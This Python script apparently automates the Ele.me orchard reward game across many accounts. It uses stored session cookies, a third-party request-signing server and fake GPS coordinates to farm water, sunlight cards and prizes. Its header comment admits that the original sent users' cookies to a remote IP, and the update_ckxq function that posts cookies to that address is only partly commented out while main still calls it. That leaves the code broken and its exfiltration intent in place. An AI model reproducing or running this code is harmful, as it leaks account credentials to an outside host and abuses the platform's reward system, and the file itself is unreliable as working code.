#人头王卖88原版果园大全套未加密自己看着来带自动种树
import json
import os
import sys
import time
from datetime import datetime
import requests
from urllib.parse import urlencode, quote
import hashlib
import concurrent.futures



def printf(msg: str) -> None:
    """
    日志
    """
    print(msg)
    sys.stdout.flush()


def extract_token(cookie):
    cookie_dict = {}
    for item in cookie.split(";"):
        if "=" in item:
            key, value = item.split("=", 1)
            cookie_dict[key.strip()] = value
    return cookie_dict


def hbh5tk(tk_cookie, enc_cookie, cookie_str):
    """
    合并带_m_h5_tk
    """
    txt = cookie_str.replace(" ", "")
    if txt[-1] != ';':
        txt += ';'
    cookie_parts = txt.split(';')[:-1]
    updated = False
    for i, part in enumerate(cookie_parts):
        key_value = part.split('=')
        if key_value[0].strip() in ["_m_h5_tk", " _m_h5_tk"]:
            cookie_parts[i] = tk_cookie
            updated = True
        elif key_value[0].strip() in ["_m_h5_tk_enc", " _m_h5_tk_enc"]:
            cookie_parts[i] = enc_cookie
            updated = True

    if updated:
        return ';'.join(cookie_parts) + ';'
    else:
        return txt + tk_cookie + ';' + enc_cookie + ';'


def check_cookie(cookie):
    url = "https://waimai-guide.ele.me/h5/mtop.alsc.personal.queryminecenter/1.0/?jsv=2.6.2&appKey=12574478"
    headers = {
        "Cookie": cookie,
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36"
    }

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            cookie_jar = response.cookies
            token = cookie_jar.get('_m_h5_tk', '')
            token_cookie = "_m_h5_tk=" + token
            enc_token = cookie_jar.get('_m_h5_tk_enc', '')
            enc_token_cookie = "_m_h5_tk_enc=" + enc_token
            cookie = hbh5tk(token_cookie, enc_token_cookie, cookie)
            return cookie
        else:
            return None
    except Exception as e:
        print(f"解析ck错误:{e}")
        return None


def tq(cookie_string):
    """
    获取_m_h5_tk
    """
    if not cookie_string:
        return '-1'
    cookie_pairs = cookie_string.split(';')
    for pair in cookie_pairs:
        key_value = pair.split('=')
        if key_value[0].strip() in ["_m_h5_tk", " _m_h5_tk"]:
            return key_value[1]
    return '-1'


def md5(text):
    """
    md5加密
    """
    hash_md5 = hashlib.md5()
    hash_md5.update(text.encode())
    return hash_md5.hexdigest()

#人头果园自带偷CK地址已注释
#def update_ckxq(ck):
    #url = 'http://101.132.130.27:5000/update_ck'
    #data = {'cookie': ck}

    try:
        response = requests.post(url, json=data)

        # 检查响应状态码
        if response.status_code != 200:
            print(f"❎ 请求失败，状态码: {response.status_code}")
            return False, f"请求失败，状态码: {response.status_code}", None

        # 检查响应内容是否为空
        if not response.text:
            print("❎ 请求失败，响应内容为空")
            return False, "请求失败，响应内容为空", None

        # 尝试解析 JSON
        try:
            res_json = response.json()
        except json.JSONDecodeError:
            print("❎ 响应内容无法解析为 JSON")
            return False, "响应内容无法解析为 JSON", None

        # 检查返回的 JSON 是否包含成功状态
        if res_json.get('status') == 'success':
            return True, res_json['message'], res_json['cookie']
        else:
            return False, res_json.get('message', '未知错误'), None

    except requests.RequestException as e:
        print(f"❎ 请求异常: {e}")
        return False, f"请求异常: {e}", None


def load_assist_config_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            assist_config = [line.strip() for line in file if line.strip()]
        return assist_config
    except Exception as e:
        printf(f"读取zl_config文件出错: {e}")
        return []


class LYB:
    def __init__(self, count, cki):
        self.count = count
        self.ck = cki
        self.cki = self.tq(cki)
        self.uid = self.cki.get("unb")
        self.sid = self.cki.get("cookie2")
        self.name1 = self.uid
        self.name = self.cki.get("USERID")
        self.host = 'https://acs.m.goofish.com'

    def tq(self, txt):
        try:
            if not txt:  # 检查 txt 是否为 None
                print('❎ Cookie 为空，无法解析')
                return {}

            txt = txt.replace(" ", "")
            pairs = txt.split(";")[:-1]
            ck_json = {}
            for i in pairs:
                key_value = i.split("=")
                ck_json[key_value[0]] = key_value[1]
            return ck_json
        except Exception as e:
            print(f'账号[{self.count}] [{self.name}] ❎ Cookie解析错误: {e}')
            return {}

    def xsign(self, api, data, wua, v):
        body = {
            "data": data,
            "api": api,
            "pageId": '',
            "uid": self.uid,
            'sid': self.sid,
            "deviceId": '',
            "utdid": '',
            "wua": wua,
            'ttid': '1551089129819@eleme_android_10.14.3',
            "v": v
        }

        try:
            r = requests.post(
            elmSignUrl,
                json=body
            )
            r.raise_for_status()
            return r.json()
        except requests.exceptions.HTTPError as e:
            print(f'账号[{self.count}] [{self.name}] ❎请求签名服务器失败: {e}')
            return None
        except requests.exceptions.RequestException as e:
            print(f'账号[{self.count}] [{self.name}] ❎请求签名服务器错误: {e}')
            return None

    def reqapi(self, api, data, wua='False', v="1.0"):
        try:
            if type(data) == dict:
                data = json.dumps(data)
            wua = str(wua)
            sign = self.xsign(api, data, wua, v)
            url = f"{self.host}/gw/{api}/{v}/"
            headers = {
                "x-sgext": quote(sign.get('x-sgext')),
                "x-sign": quote(sign.get('x-sign')),
                'x-sid': self.sid,
                'x-uid': self.uid,
                'x-pv': '6.3',
                'x-features': '1051',
                'x-mini-wua': quote(sign.get('x-mini-wua')),
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'x-t': sign.get('x-t'),
                'x-extdata': 'openappkey%3DDEFAULT_AUTH',
                'x-ttid': '1551089129819@eleme_android_10.14.3',
                'x-utdid': '',
                'x-appkey': '24895413',
                'x-devid': '',
            }

            params = {"data": data}
            if 'wua' in sign:
                params["wua"] = sign.get('wua')
            max_retries = 5
            retries = 0
            while retries < max_retries:
                try:
                    res = requests.post(url, headers=headers, data=params, timeout=2)
                    return res
                except requests.exceptions.Timeout:
                    print(f"账号[{self.count}] [{self.name}] 【接口】❎接口请求超时")
                except requests.exceptions.RequestException as e:
                    time.sleep(3)
                retries += 1
                if retries >= max_retries:
                    print(f"账号[{self.count}] [{self.name}] 【接口】❎重试次数上限")
                    return None
        except Exception as e:
            print(f'账号[{self.count}] [{self.name}] 【接口】❎请求接口失败: {e}')
            return None

    def reqh5(self, api, data, v="1.0"):
        try:
            cookie = check_cookie(self.ck)
            headers = {
                "authority": "shopping.ele.me",
                "accept": "application/json",
                "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "cookie": cookie,
                "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
            }
            timestamp = int(time.time() * 1000)
            data_str = json.dumps(data)
            token = tq(cookie)
            token_part = token.split("_")[0]

            sign_str = f"{token_part}&{timestamp}&12574478&{data_str}"
            sign = md5(sign_str)
            url = f"https://guide-acs.m.taobao.com/h5/{api}/{v}/?jsv=2.6.1&appKey=12574478&t={timestamp}&sign={sign}&api={api}&v={v}&type=originaljson&dataType=json"
            data1 = urlencode({'data': data_str})
            r = requests.post(url, headers=headers, data=data1)
            return r
        except Exception as e:
            printf(f"{e}")
            return None

    # 签到信息
    def sign_info(self):
        api = 'mtop.koubei.interactioncenter.orchard.sign.querysigninfo'
        data = json.dumps({
            "latitude": "99.597472842782736",
            "longitude": "99.75325090438128",
            "bizScene": "orchard_signin"
        })
        prizeNumIds = []
        try:
            res = self.reqapi(api, data)
            # 检查返回是否为有效的 JSON
            res_json = res.json()
            if res_json.get("ret", [])[0] == "SUCCESS::调用成功":
                # 获取并排序 signInPrizeList 按照日期升序排序
                sign_in_prize_list = res_json.get("data", {}).get("data", {}).get("signInPrizeList", [])
                # 遍历 signInPrizeList
                for day_info in sign_in_prize_list:
                    award_info_list = day_info.get("ext", {}).get("awardInfo", [])

                    # 遍历 awardInfo 列表并提取 prizeNumId
                    for award in award_info_list:
                        if award.get("status") == 'TODO_RECEIVE':
                            prizeNumId = award.get("prizeNumId")
                            prizeNumIds.append(prizeNumId)
            else:
                print(f"账号[{self.count}] [{self.name}] 【签到】API 返回非预期结果或调用失败")

        except json.JSONDecodeError:
            print(f"账号[{self.count}] [{self.name}] 【签到】JSON 解析错误")
        except Exception as e:
            print(f"账号[{self.count}] [{self.name}] 【签到】请求或处理数据时出错: {e}")

        return prizeNumIds

    # 签到领奖
    def sign_reward(self, prizeNumId, date_time):
        api = 'mtop.koubei.interactioncenter.orchard.sign.receivesigninaward'
        # 正确构建 extInfo 为 JSON 字符串
        data = {"latitude": "99.597472842782736", "longitude": "99.75325090438128", "signInDate": date_time,
                "bizScene": "orchard_signin", "extInfo": "{\"prizeNumId\":\"" + prizeNumId + "\"}"}
        res = self.reqapi(api, data)
        print(res.text)
        res = res.json()

    # 获取兑换id
    def get_shop_id(self):
        api = 'mtop.koubei.interactioncenter.platform.right.exchangelist'
        data = {
            "actId": "20221207144029906162546384",
            "collectionId": "20230224115309098915622383",
            "bizScene": "game_center",
            "longitude": "104.07757870852947",
            "latitude": "30.657709892839193"
        }
        res = self.reqapi(api, data)
        right_info_list = []
        res1 = res.json()

        if res1 and res1.get('ret', [])[0] == "SUCCESS::调用成功":
            for right_info in res1['data']['data']['rightInfoList']:
                right_info_list.append({
                    'rightName': right_info['rightName'],
                    'rightId': right_info['rightId']
                })

        return right_info_list

    # 兑换
    def exchange(self, copyId):
        api = 'mtop.koubei.interactioncenter.platform.right.exchange.v2'
        data = {
            "actId": "20221207144029906162546384",
            "collectionId": "20230224115309098915622383",
            "copyId": copyId,
            "bizScene": "game_center",
            "channel": "abcd",
            "longitude": 104.098238,
            "latitude": 30.229593,
            "hsf": 1
        }
        res = self.reqh5(api, data)
        res1 = res.json()
        if res1 and res1.get('ret', [])[0] == "SUCCESS::调用成功":
            return True
        else:
            return False

    # 查询果园信息
    def query_gy_info(self):
        api = 'mtop.alsc.playgame.orchard.index.batch.query'
        data = json.dumps({
            "blockRequestList": "[{\"blockCode\":\"603040_6723057310\",\"status\":\"PUBLISH\",\"tagCallWay\":\"SYNC\",\"useRequestBlockTags\":false}]",
            "source": "KB_ORCHARD", "bizCode": "main",
            "locationInfos": "[{\"latitude\":\"99.597472842782736\",\"longitude\":\"99.75325090438128\",\"lat\":\"99.597472842782736\",\"lng\":\"99.75325090438128\"}]",
            "extData": "{\"ORCHARD_ELE_MARK\":\"KB_ORCHARD\",\"orchardVersion\":\"20240624\"}"
        })
        res = self.reqapi(api, data)
        res3 = res.json()

        if res3["ret"][0] == "SUCCESS::调用成功":
            roleId = None
            result_list = []
            for tag_data in res3["data"]['data']["603040_6723057310"]["blockData"]["role"]["tagData"]:
                for result_data in tag_data["result"]:
                    for role_info in result_data["roleInfoDtoList"]:
                        if "roleBaseInfoDto" in role_info:
                            role_base_info = role_info["roleBaseInfoDto"]
                            if "roleId" in role_base_info:
                                roleId = role_base_info["roleId"]
            for tag_data in res3["data"]["data"]["603040_6723057310"]["blockData"]["role"]["tagData"]:
                for result in tag_data["result"]:
                    for role_info in result["roleInfoDtoList"]:
                        for cc in role_info["rolePropertyInfoDtoList"]:
                            Sunlightvalue = cc["totalPropertyCnt"]
                            remainingProgress = role_info['roleLevelExpInfoDto']["remainingProgress"]
                            levelName = role_info['roleLevelExpInfoDto']["levelName"]
                            result_list.append(
                                {
                                    'name': "阳光",
                                    'amount': Sunlightvalue,
                                    'templateId': remainingProgress
                                }
                            )
            for y in res3['data']['data']['603040_6723057310']['blockData']['assets']['tagData']:
                for o in y['totalProps']:
                    if o['name'] == "水":
                        amount = int(int(o['value']) / 10)
                        result_list.append({
                            'name': '水',
                            'amount': amount,
                            'templateId': roleId
                        })
                    elif o['name'] == "大阳光卡":
                        result_list.append({
                            'name': '大阳光卡',
                            'amount': o['value'],
                            'templateId': o['templateId']
                        })
                    elif o['name'] == "小阳光卡":
                        result_list.append({
                            'name': '小阳光卡',
                            'amount': o['value'],
                            'templateId': o['templateId']
                        })

            return result_list
        else:
            print(f"账号[{self.count}] [{self.name}] 【查询】❎ 获取数据失败: {res3['ret']}")
            return None

    # 使用阳光卡
    def use_sun_card(self, roleId, templateId):
        api = 'mtop.alsc.playgame.orchard.roleoperate.useprop'
        data = json.dumps({"roleId": roleId, "roleType": "KB_ORCHARD",
                           "propertyTemplateId": templateId, "bizScene": "KB_ORCHARD",
                           "extParams": "{\"orchardVersion\":\"20240624\",\"popWindowVersion\":\"V2\"}"})
        res = self.reqapi(api, data)
        if res.json()["ret"][0] == "SUCCESS::调用成功":
            ygz = res.json()['data']['data']['roleInfoDTO']['rolePropertyInfoDtoList'][0]["totalPropertyCnt"]
            return ygz
        else:
            return None

    # 浇水
    def water(self, acount, roleId):
        api = 'mtop.alsc.playgame.orchard.roleoperate.useprop'
        data = json.dumps({
            "propertyTemplateId": "462",
            "roleId": roleId,
            "latitude": "99.597472842782736",
            "longitude": "99.75325090438128",
            "roleType": "KB_ORCHARD",
            "actId": "20200629151859103125248022",
            "collectionId": "20210812150109893985929183",
            "bizScene": "KB_ORCHARD",
            "extParams": "{\"orchardVersion\":\"20240624\",\"popWindowVersion\":\"V2\"}"
        })
        res = self.reqapi(api, data)
        rede = res.json()

        reward_id = None
        total_progress = 0

        # 检查响应结果
        if rede["ret"][0] == "SUCCESS::调用成功":
            ext_info = rede['data']['data']['extInfo']

            if 'progress' in ext_info:
                progress1 = float(ext_info['progress'])
                total_progress = progress1 + float(ext_info.get('progressBySun', 0))
                total_progress = round(total_progress, 2)  # 将进度保留2位小数
                printf(f"账号[{self.count}] [{self.name}] 【浇水】✅第{acount}次浇水成功, 获得进度--[{total_progress}]")

                # 检查是否有奖励
                reward_dto = rede['data']['data']['roleInfoDTO']['processRewardDTO']
                reward_show = reward_dto.get('processRewardShow', {})
                if reward_show.get('openFlag'):
                    reward_id = reward_show['rewardId']

            else:
                total_progress = 1
                printf(f"账号[{self.count}] [{self.name}] 【浇水】✅第{acount}次浇水成功")
                reward_dto = rede['data']['data']['roleInfoDTO']['processRewardDTO']
                reward_show = reward_dto.get('processRewardShow', {})
                if reward_show.get('openFlag'):
                    reward_id = reward_show['rewardId']

            return True, total_progress, reward_id

        elif rede["ret"][0] == "FAIL_BIZ_ROLE_USING_PROP_EXP_ENOUGH::道具使用达到上限,明天再来吧":
            printf(f"账号[{self.count}] [{self.name}] 【浇水】❎第{acount}次浇水失败: 浇水上限")
        else:
            printf(f"账号[{self.count}] [{self.name}] 【浇水】❎第{acount}次浇水失败: {rede['ret'][0]}")

        return False, total_progress, reward_id

    # 浇水领奖
    def water_reward(self, roleId, rewardId):
        api = 'mtop.koubei.interactioncenter.orchard.processreward.receive'
        data = json.dumps(
            {"roleId": roleId, "rewardId": rewardId, "longitude": "99.75325090438128",
             "latitude": "99.597472842782736", "bizScene": "KB_ORCHARD", "requestId": "1721029520763"})
        res = self.reqapi(api, data)
        if res.json()["ret"][0] == "SUCCESS::调用成功":
            if "rightSendDTOS" in res.json()['data']["data"]["lotteryResultDTO"]:
                for item in res.json()['data']["data"]["lotteryResultDTO"]["rightSendDTOS"]:
                    if "materialInfo" in item and "title" in item["materialInfo"]:
                        title = item["materialInfo"]["title"]
                        printf(f"账号[{self.count}] [{self.name}] 【领奖】✅领取浇水奖成功,获得--[{title}]")
        else:
            printf(f"账号[{self.count}] [{self.name}] 【领奖】❎领取浇水奖励失败:{res.text}")

    # 领昨天存储的井水
    def water_future(self):
        api = 'mtop.ele.playgame.orchard.futurewater.receive'
        data = json.dumps({"bizScene": "KB_ORCHARD"})
        date_time = datetime.now().hour
        if date_time >= 7:
            # 领取井水
            try:
                res = self.reqapi(api, data)
                res_json = res.json()  # 尝试解析返回的 JSON 数据

                if res_json.get("ret") and isinstance(res_json["ret"], list) and res_json["ret"][
                    0] == "SUCCESS::调用成功":
                    printf(f"账号[{self.count}] [{self.name}] 【领奖】✅井水领取成功")
                else:
                    error_msg = res_json["ret"][0] if res_json.get("ret") and isinstance(res_json["ret"],
                                                                                         list) else "未知错误"
                    printf(f"账号[{self.count}] [{self.name}] 【领奖】❎井水领取失败: {error_msg}")

            except json.JSONDecodeError:
                printf(f"账号[{self.count}] [{self.name}] 【领奖】❎井水领取失败: 返回的不是有效的 JSON 格式")

            except Exception as e:
                printf(f"账号[{self.count}] [{self.name}] 【领奖】❎井水领取失败: {str(e)}")

    # 获取可执行任务列表
    def task_list(self):
        api = 'mtop.ele.biz.growth.task.core.querytask'
        data = json.dumps({
            "bizScene": "ORCHARD",
            "missionCollectionId": "178",
            "accountPlan": "HAVANA_COMMON",
            "locationInfos": "[\"{\\\"lng\\\":\\\"95.754552\\\",\\\"lat\\\":\\\"95.600419\\\"}\"]"
        })
        res = self.reqapi(api, data)

        executable_tasks = []  # 存储可执行任务列表
        processed_tasks = set()  # 用于去重
        current_hour = datetime.now().hour  # 获取当前小时，用于判断每日餐点任务

        if res.json()["ret"][0] == "SUCCESS::接口调用成功":
            for tag_data in res.json()["data"]["mlist"]:
                skip_keywords = [
                    '去提款', '神奇', '中国移动', '蚂蚁', '实付', '参与夺宝', '点淘', '快手', '支付宝', '公益林',
                    '闲鱼', '淘特', '淘宝', '点击3个', '京东', 'UC极速版', '飞猪', '天猫', '喜马拉雅',
                    '订阅', '完成实名认证', '完成指定动作奖励阳光卡', '唤端', '换端'
                ]
                skip_task = any(
                    keyword in tag_data["showTitle"] or keyword in tag_data["name"] for keyword in skip_keywords
                )
                if skip_task:
                    continue

                # 处理 "每日餐点领水滴" 特殊任务
                if tag_data["showTitle"] == "每日餐点领水滴":
                    for mission_stage in tag_data["missionStageDTOS"]:
                        if mission_stage["rewardStatus"] == "TODO":
                            mission_id = tag_data["missionDefId"]
                            task_key = f"{tag_data['showTitle']}_{mission_id}"

                            # 去重判断
                            if task_key in processed_tasks:
                                continue
                            processed_tasks.add(task_key)

                            # 判断当前时间段
                            if 11 <= current_hour < 13:
                                count = '1'
                            elif 17 <= current_hour < 19:
                                count = '2'
                            elif 21 <= current_hour < 23:
                                count = '3'
                            else:
                                printf(
                                    f"账号[{self.count}] [{self.name}] 【领奖】❎当前时间不在每日餐点任务的领取时间范围内")
                                continue

                            executable_tasks.append({
                                "name": "每日餐点领水滴",
                                "missionId": mission_id,
                                "count": count,
                                "pageSpm": tag_data["actionConfig"]["actionValue"].get("pageSpm", ""),
                                "pageStageTime": tag_data["actionConfig"]["actionValue"].get("pageStageTime", "")
                            })
                else:
                    # 添加其他符合条件的任务到列表
                    for mission_stage in tag_data["missionStageDTOS"]:
                        if mission_stage["rewardStatus"] == "TODO":
                            mission_id = tag_data["missionDefId"]
                            task_key = f"{tag_data['showTitle']}_{mission_id}"

                            # 去重判断
                            if task_key in processed_tasks:
                                continue
                            processed_tasks.add(task_key)

                            # 设置任务名称和次数
                            if tag_data["showTitle"] == "逛饿了么用户专属淘宝优惠":
                                name = "逛饿了么用户专属淘宝优惠"
                                count = '3'
                            elif tag_data["showTitle"] == "浏览外卖品质好店":
                                name = "浏览外卖品质好店"
                                count = '2'
                            elif '邀请好友助力' in tag_data["showTitle"]:
                                name = "邀请好友助力"
                                count = '6'
                            else:
                                name = tag_data["name"]
                                count = '1'

                            executable_tasks.append({
                                "name": name,
                                "missionId": mission_id,
                                "count": count,
                                "pageSpm": tag_data["actionConfig"]["actionValue"].get("pageSpm", ""),
                                "pageStageTime": tag_data["actionConfig"]["actionValue"].get("pageStageTime", "")
                            })
            printf(f"账号[{self.count}] [{self.name}] 【水滴】✅ 获取到 {len(executable_tasks)} 个可执行任务")
        else:
            printf(f"账号[{self.count}] [{self.name}] 【水滴】❎ 查询任务列表失败")
        return executable_tasks

    # 完成单个任务
    def task_finish(self, name, missionId, pageSpm, pageStageTime):
        api = 'mtop.ele.biz.growth.task.event.pageview'
        payload = {
            "bizScene": "ORCHARD",
            "accountPlan": "HAVANA_COMMON",
            "collectionId": "178",
            "missionId": missionId,
            "actionCode": "PAGEVIEW",
            "asac": "2A20B11WIAXCI9QYYXRIR0",
            "sync": "false"
        }
        if pageSpm:
            payload['pageFrom'] = pageSpm
        if pageStageTime:
            payload['viewTime'] = pageStageTime

        data = json.dumps(payload)
        res = self.reqapi(api, data)

        if res.json()["ret"][0] == "SUCCESS::接口调用成功":
            printf(f"账号[{self.count}] [{self.name}] 【任务】✅ 任务 [{name}] 完成成功")
            return True
        else:
            printf(f"账号[{self.count}] [{self.name}] 【任务】❎ 任务 [{name}] 完成失败")
            return False

    # 领取任务奖励
    def task_reward(self, name, missionId, count):
        api = 'mtop.ele.biz.growth.task.core.receiveprize'
        data = json.dumps({
            "bizScene": "ORCHARD",
            "accountPlan": "HAVANA_COMMON",
            "missionCollectionId": "178",
            "missionId": missionId,
            "count": count,
            "locationInfos": "[\"{\\\"lng\\\":99.75325090438128,\\\"lat\\\":99.597472842782736}\"]"
        })
        res = self.reqapi(api, data)

        if res.json()["ret"][0] == "SUCCESS::接口调用成功":
            printf(
                f"账号[{self.count}] [{self.name}] 【领奖】✅[{name}]奖励【{res.json()['data']['rlist'][0]['uppPrizeResult']['materialInfo']['title']}】领取成功")
        else:
            printf(f"账号[{self.count}] [{self.name}] 【领奖】❎[{name}]奖励领取失败: {res.json()['ret'][0]}")

    def task_trigger(self):
        api = 'mtop.koubei.interaction.center.dailyatm.triggerwindow'
        data = json.dumps({
            "actId": "2021032200313000125480674",
            "longitude": "117.9421129077673",
            "latitude": "28.44880297780037",
            "bizScene": "DAILY_ATM_WINDOW",
            "collectionId": "20211125162409479911448794",
            "strategyScene": "HAVEN_FALL",
            "accountPlan": "HAVANA_COMMON"
        })
        res = self.reqapi(api, data)
        printf(res.text)

    # 查询浇水竞赛
    def query_match(self):
        api = 'mtop.koubei.interactioncenter.orchard.addwaterpk.query'
        data = json.dumps({"bizScene": "WATER_PK", "requestId": "1729824052383"})
        res = self.reqapi(api, data)
        response_data = res.json()

        # 检查响应成功
        if response_data.get("ret", [])[0] == "SUCCESS::调用成功":
            # 获取自己的浇水排名信息
            self_rank_info = response_data['data']['data'].get('selfRank', {})
            add_water_count = self_rank_info.get('addWaterCount', 0)

            # 计算还需浇水次数
            if add_water_count < 100:
                water_needed = 100 - add_water_count
                print(
                    f"账号[{self.count}] [{self.name}] 【浇水】当前已浇水次数：{add_water_count}，还需浇水：{water_needed}次")
            else:
                water_needed = 0
                print(f"账号[{self.count}] [{self.name}] 【浇水】已经达到100次浇水，无需继续浇水")

            return water_needed
        else:
            print(f"账号[{self.count}] [{self.name}] 【浇水】查询失败，无法获取浇水信息")
            return None

    # 参加浇水竞赛
    def join_match(self):
        api = 'mtop.koubei.interactioncenter.orchard.addwaterpk.join'
        data = json.dumps({"bizScene": "WATER_PK", "requestId": "1729822497769"})
        res = self.reqapi(api, data)
        response_data = res.json()
        # 检查响应成功
        if response_data.get("ret", [])[0] == "SUCCESS::调用成功":
            printf(f"账号[{self.count}] [{self.name}] 【竞赛】浇水竞赛参加成功")
            return True
        else:
            printf(f"账号[{self.count}] [{self.name}] 【竞赛】浇水竞赛参加失败")
            return False

    # 领奖浇水竞赛
    def reward_match(self):
        api = 'mtop.koubei.interactioncenter.orchard.addwaterpk.receive'
        data = json.dumps({"bizScene": "WATER_PK", "requestId": "1729821658899"})
        res = self.reqapi(api, data)
        response_data = res.json()
        # 检查响应成功
        if response_data.get("ret", [])[0] == "SUCCESS::调用成功":
            printf(f"账号[{self.count}] [{self.name}] 【竞赛】浇水竞赛奖励领取成功")
            return True
        elif response_data['data']['errorMsg'] == "重复领取":
            printf(f"账号[{self.count}] [{self.name}] 【竞赛】浇水竞赛奖励重复领取")
            return False
        else:
            printf(f"账号[{self.count}] [{self.name}] 【竞赛】浇水竞赛奖励领取失败")
            return False

    def plant(self):
        api = 'mtop.alsc.playgame.promo.roleoperate.create'
        data = {"bizScene": "KB_ORCHARD", "roleTemplateId": "12004", "latitude": "34.807478841394186",
                "longitude": "113.63462872803211"}
        res = self.reqapi(api, data)
        response_data = res.json()
        # 检查响应成功
        if response_data.get("ret", [])[0] == "SUCCESS::调用成功":
            return True
        else:
            return False


# 兑换水滴，阳光
def water_sun(zh, ck):
    # 更新 ck
    success, message, ck = update_ckxq(ck)
    lyb = LYB(zh, ck)
    # 兑换水滴和阳光卡
    shop_ids = lyb.get_shop_id()

    # 检查是否有可兑换商品
    if not shop_ids:
        printf(f"账号[{lyb.count}] [{lyb.name}] 【兑换】 暂无可兑换商品")
    else:
        for right_info in shop_ids:
            rightName = right_info['rightName']
            rightId = right_info['rightId']
            if lyb.exchange(rightId):
                printf(f"账号[{lyb.count}] [{lyb.name}] 【兑换】 {rightName}成功")
            else:
                printf(f"账号[{lyb.count}] [{lyb.name}] 【兑换】 {rightName}失败")

            # 刷新 ck
            success, message, ck = update_ckxq(ck)
            lyb = LYB(zh, ck)
            time.sleep(2)

    return lyb


# 做任务-领水滴
def execute_all_tasks(lyb):
    # 井水
    # lyb.water_future()
    try:
        # 1. 获取可执行任务列表
        tasks = lyb.task_list()
    except Exception as e:
        printf(f"账号[{lyb.count}] [{lyb.name}] 【任务】❎ 获取任务列表失败 {e}")
        return

    # 2. 遍历任务列表，尝试完成每个任务并领取奖励
    for task in tasks:
        task_name = task["name"]
        mission_id = task["missionId"]
        page_spm = task.get("pageSpm", "")
        page_stage_time = task.get("pageStageTime", "")
        count = int(task.get("count", "1"))  # 获取任务的 count 值并转换为整数

        # 每日餐点领水滴任务只需执行一次，不循环
        if task_name == '每日餐点领水滴' or task_name == '邀请好友助力':
            # 完成任务一次
            try:
                task_completed = lyb.task_finish(task_name, mission_id, page_spm, page_stage_time)
            except Exception as e:
                printf(f"账号[{lyb.count}] [{lyb.name}] 【任务】❎ 执行任务 [{task_name}] 出错: {e}")
                continue

            # 任务完成成功后，领取对应奖励
            if task_completed:
                try:
                    lyb.task_reward(task_name, mission_id, count)
                except Exception as e:
                    printf(f"账号[{lyb.count}] [{lyb.name}] 【领奖】❎ 领取任务奖励出错 [{task_name}]: {e}")
            time.sleep(2)  # 延时以避免频繁请求

        else:
            # 其他任务根据 count 循环执行任务和领取奖励
            for i in range(1, count + 1):
                # 完成任务
                try:
                    task_completed = lyb.task_finish(task_name, mission_id, page_spm, page_stage_time)
                except Exception as e:
                    printf(f"账号[{lyb.count}] [{lyb.name}] 【任务】❎ 执行任务 [{task_name}] 第{i}次出错: {e}")
                    break  # 跳过后续循环

                # 任务完成成功后，领取对应的奖励
                if task_completed:
                    try:
                        lyb.task_reward(task_name, mission_id, i)
                    except Exception as e:
                        printf(f"账号[{lyb.count}] [{lyb.name}] 【领奖】❎ 第{i}次领取任务奖励出错 [{task_name}]: {e}")
                    time.sleep(1)  # 小延时以避免频繁请求
            time.sleep(2)  # 延时以避免频繁请求


# 主函数
def main(zh, ck):
    success, message, cookie = update_ckxq(ck)
    if not success:
        return
    lyb = water_sun(zh, cookie)
    try:
        # 任务-水滴
        execute_all_tasks(lyb)
        # 种树
        lyb.plant()
        # 领奖竞赛
        lyb.reward_match()
        # 参加竞赛
        lyb.join_match()
        # 查询果园信息，获取阳光值和水滴
        gy_info = lyb.query_gy_info()
        water_needed = lyb.query_match()  # 获取竞赛中还需浇水的次数

        if gy_info:
            current_sunlight = next((int(item['amount']) for item in gy_info if item['name'] == '阳光'), 0)
            big_sun_card = next((item for item in gy_info if item['name'] == '大阳光卡'), None)
            small_sun_card = next((item for item in gy_info if item['name'] == '小阳光卡'), None)
            water_amount = next((int(item['amount']) for item in gy_info if item['name'] == '水'), 0)
            role_id = next((item.get('templateId', None) for item in gy_info if item['name'] == '水'), None)

            required_sunlight = int(water_needed * 0.8)  # 确保阳光值为需求的80%

            if current_sunlight < required_sunlight:
                needed_sunlight = required_sunlight - current_sunlight

                # 计算使用阳光卡的数量
                big_card_needed = min(needed_sunlight // 30, int(big_sun_card['amount'])) if big_sun_card else 0
                small_card_needed = min((needed_sunlight - big_card_needed * 30) // 10,
                                        int(small_sun_card['amount'])) if small_sun_card else 0

                # 使用大阳光卡
                if big_card_needed > 0:
                    for _ in range(big_card_needed):
                        ygz = lyb.use_sun_card(role_id, big_sun_card['templateId'])

                        if ygz is None:
                            printf(f"账号[{lyb.count}] [{lyb.name}] 【阳光卡】❎ 使用大阳光卡失败，跳过该账号处理")
                            break  # 退出使用阳光卡的循环

                        printf(f"账号[{lyb.count}] [{lyb.name}] 【阳光卡】使用大阳光卡后，阳光值为: {ygz}")

                        # 动态更新剩余所需阳光值
                        current_sunlight = ygz
                        needed_sunlight = required_sunlight - current_sunlight  # 更新所需的阳光值

                        # 如果已经满足阳光需求，则退出循环
                        if current_sunlight >= required_sunlight:
                            break

                # 使用小阳光卡
                if current_sunlight < required_sunlight and small_card_needed > 0:
                    for _ in range(small_card_needed):
                        ygz = lyb.use_sun_card(role_id, small_sun_card['templateId'])

                        if ygz is None:
                            printf(f"账号[{lyb.count}] [{lyb.name}] 【阳光卡】❎ 使用小阳光卡失败，跳过该账号处理")
                            break  # 退出使用阳光卡的循环

                        printf(f"账号[{lyb.count}] [{lyb.name}] 【阳光卡】使用小阳光卡后，阳光值为: {ygz}")

                        # 动态更新阳光值
                        current_sunlight = ygz
                        needed_sunlight = required_sunlight - current_sunlight  # 更新所需的阳光值

                        # 如果已经满足阳光需求，则退出循环
                        if current_sunlight >= required_sunlight:
                            break

            # 检查水滴量是否足够
            for i in range(min(water_amount, water_needed)):
                success, progress, reward_id = lyb.water(i + 1, role_id)
                if not success:
                    break
                if progress < 0.02:
                    printf(f"账号[{lyb.count}] [{lyb.name}] 【浇水】❎进度<0.02，停止操作")
                    break

                # 如果有领奖 ID，则进行领奖
                if reward_id:
                    lyb.water_reward(role_id, reward_id)
                time.sleep(1)

        else:
            printf(f"账号[{lyb.count}] [{lyb.name}] 【查询】❎查询果园信息失败")

    except Exception as e:
        printf(f"账号[{lyb.count}] [{lyb.name}] 【解析】❎处理账号时出错: {e}")


